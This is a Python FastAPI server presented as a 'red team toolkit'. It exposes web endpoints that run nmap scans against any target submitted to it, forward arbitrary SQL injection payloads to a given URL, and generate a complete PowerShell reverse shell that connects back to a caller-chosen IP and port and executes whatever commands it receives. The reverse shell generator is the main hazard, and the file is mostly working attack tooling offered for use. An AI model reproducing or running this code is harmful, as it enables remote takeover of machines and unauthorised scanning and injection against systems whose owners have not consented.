# singularity_drive_server.py
from fastapi import FastAPI, Form
from fastapi.staticfiles import StaticFiles
from fastapi.responses import JSONResponse
import subprocess
import os

app = FastAPI(title="Quantum Bandit Red Team Toolkit")

# ✅ Update to point to your real UI folder
app.mount(
    "/",
    StaticFiles(directory="D:/Ai Core/SingularityDrive/BugBounty", html=True),
    name="static"
)


# 🛰️ Recon Endpoint
@app.post("/recon")
async def run_nmap(target: str = Form(...)):
    try:
        result = subprocess.check_output(["nmap", "-sV", target], text=True)
        return JSONResponse(content={"output": result})
    except Exception as e:
        return JSONResponse(status_code=500, content={"error": str(e)})


# 🧨 Exploit Endpoint
@app.post("/exploit")
async def sql_injection_test(target: str = Form(...), payload: str = Form(...)):
    try:
        import requests
        r = requests.post(target, json={"query": payload})
        return JSONResponse(content={"status": r.status_code, "response": r.text})
    except Exception as e:
        return JSONResponse(status_code=500, content={"error": str(e)})


# 💉 Payload Generator Endpoint
@app.get("/payload")
async def generate_shell(ip: str, port: int):
    payload = f"powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});" \
              f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{" \
              f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);" \
              f"$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" \
              f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" \
              f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
    return JSONResponse(content={"payload": payload})


# ✅ DO NOT overwrite the app here
# ❌ app = FastAPI()

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="127.0.0.1", port=8000)
